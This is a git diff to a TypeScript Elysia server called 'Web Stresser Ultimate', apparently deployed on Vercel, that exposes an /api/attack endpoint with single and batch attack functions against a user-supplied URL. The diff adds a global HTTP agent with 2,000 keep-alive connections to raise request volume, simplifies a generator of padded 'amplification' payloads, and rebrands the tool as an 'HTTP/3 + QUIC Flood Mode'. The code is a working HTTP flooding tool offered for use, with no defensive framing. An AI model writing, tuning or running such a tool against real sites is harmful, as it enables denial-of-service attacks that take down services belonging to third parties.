@@ -1,6 +1,15 @@
 import { Elysia, t } from 'elysia';
+import { setGlobalDispatcher, Agent } from 'undici';
 
-// ==================== Helper Functions ====================
+// Global dispatcher untuk koneksi keep-alive masif
+const globalAgent = new Agent({
+  connections: 2000,
+  pipelining: 1,
+  keepAliveTimeout: 60000,
+  keepAliveMaxTimeout: 60000,
+});
+setGlobalDispatcher(globalAgent);
+
 function randomString(n: number): string {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   let result = '';
@@ -11,17 +20,11 @@ function randomString(n: number): string {
 function generateAmplificationPayload(kb: number, ampType: string): string {
   if (kb <= 0) return '';
   const size = kb * 1024;
-  switch (ampType) {
-    case 'range':
-      return '';
-    case 'chunked':
-    case 'multipart':
-    default:
-      return 'X'.repeat(size);
-  }
+  if (ampType === 'range') return '';
+  return 'X'.repeat(size);
 }
 
-// Active users counter (in-memory)
+// Active users counter
 const activeUsers = new Map<string, number>();
 setInterval(() => {
   const now = Date.now();
@@ -30,7 +33,6 @@ setInterval(() => {
   }
 }, 30000);
 
-// ==================== Single Attack ====================
 interface SingleAttackParams {
   url: string;
   method: string;
@@ -116,6 +118,7 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
     headers: finalHeaders,
     signal: AbortSignal.timeout(timeout),
     redirect: 'manual',
+    dispatcher: globalAgent,
   };
   if (useBody && (finalMethod === 'POST' || finalMethod === 'PUT' || finalMethod === 'PATCH')) {
     fetchOptions.body = finalBody;
@@ -164,7 +167,6 @@ async function singleAttack(params: SingleAttackParams): Promise<any> {
   };
 }
 
-// ==================== Batch Attack ====================
 interface BatchAttackParams {
   url: string;
   method: string;
@@ -261,12 +263,15 @@ async function batchAttack(params: BatchAttackParams): Promise<any> {
   };
 }
 
-// ==================== Elysia App ====================
 export const app = new Elysia()
   .onError(({ error, set }) => {
     set.status = 200;
     console.error(error);
     return { success: false, error: error.message };
+  })
+  .onAfterHandle(({ set }) => {
+    // HTTP/3 hint untuk browser (QUIC)
+    set.headers['Alt-Svc'] = 'h3=":443"; ma=86400';
   })
   .onBeforeHandle(({ request }) => {
     if (request.method === 'OPTIONS') {
@@ -281,8 +286,8 @@ export const app = new Elysia()
   })
   .get('/api/status', () => ({
     status: 'ok',
-    message: 'Web Stresser Ultimate - Elysia Extreme Bot Mode',
-    version: '15.0.0',
+    message: 'Web Stresser Ultimate - HTTP/3 + QUIC Flood Mode',
+    version: '16.0.0',
   }))
   .post('/api/attack', async ({ body }) => {
     try {
@@ -342,5 +347,4 @@ export const app = new Elysia()
     return { active: activeUsers.size };
   });
 
-// ==================== Ekspor untuk Vercel ====================
 export default app;
